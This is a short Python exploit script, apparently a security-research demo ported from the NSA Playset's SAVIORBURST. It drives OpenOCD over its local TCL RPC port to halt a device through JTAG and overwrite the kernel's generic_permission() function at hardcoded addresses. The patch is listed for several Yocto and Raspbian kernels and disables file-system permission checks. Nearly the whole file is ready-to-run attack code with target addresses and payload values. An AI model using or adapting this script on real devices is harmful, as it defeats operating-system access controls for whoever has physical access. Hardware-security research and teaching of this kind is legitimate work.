#!/usr/bin/env python3
# Jtagsploitation demo, covered by GNU GPLv3 or later
# Copyright (C) 2015 by @syncsrc (jtag@syncsrc.org)
# OpenOCD RPC example Copyright (C) 2014 by Andreas Ortmann (ortmann@finf.uni-hannover.de)

info = """
Linux kernel patch to disable file system ACL checking, applied via JTAG using OpenOCD."""
# Ported from SAVIORBURST, of the NSA Playset
# https://github.com/NSAPlayset/SAVIORBURST


# Known patches to generic_permission() linux kernel function
#                                 address     payload
targets = {"yocto_3.8":         [0xC10AE011, 0x00000000],
           "raspbian_3.18":     [0xC01428F4, 0xE3A00000],
           "raspbian_3.18.5":   [0xC01446A4, 0xE3A00000]} # Raspbian Wheezy 3.18.5+ #744 PREEMPT Fri Jan 30 18:19:07 GMT 2015


import socket
import itertools
import time
import argparse


class OpenOcd:
    COMMAND_TOKEN = '\x1a'
    def __init__(self, verbose=False):
        self.verbose        = verbose
        self.tclRpcIp       = "127.0.0.1"
        self.tclRpcPort     = 6666
        self.bufferSize     = 4096

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def __enter__(self):
        self.sock.connect((self.tclRpcIp, self.tclRpcPort))
        return self

    def __exit__(self, type, value, traceback):
        try:
            self.send("exit")
        finally:
            self.sock.close()

    def send(self, cmd):
        """Send a command string to TCL RPC. Return the result that was read."""
        data = (cmd + OpenOcd.COMMAND_TOKEN).encode("utf-8")
        if self.verbose:
            print("<- ", data)

        self.sock.send(data)
        return self._recv()

    def _recv(self):
        """Read from the stream until the token (\x1a) was received."""
        data = bytes()
        while True:
            chunk = self.sock.recv(self.bufferSize)
            data += chunk
            if bytes(OpenOcd.COMMAND_TOKEN, encoding="utf-8") in chunk:
                break

        if self.verbose:
            print("-> ", data)

        data = data.decode("utf-8").strip()
        data = data[:-1] # strip trailing \x1a

        return data

    def writeDword(self, address, value):
        assert value is not None
        self.send("mww 0x%x 0x%x" % (address, value))


if __name__ == "__main__":

    valid = ', '.join(list(targets.keys()))
    
    parser = argparse.ArgumentParser(description=info)
    parser.add_argument('-t', '--target', required=True,
                        help='valid targets are: ' + valid)
    opts = parser.parse_args()

    if opts.target in targets:
        address = targets[opts.target][0]
        payload = targets[opts.target][1]
    else:
        raise Exception('Unsupported target specified: ' + opts.target)

    done = False
    with OpenOcd() as ocd:
        ocd.send("reset")
        print(ocd.send("capture \"ocd_halt\"")[:-1])
        ocd.writeDword(address, payload)
        ocd.send("resume")
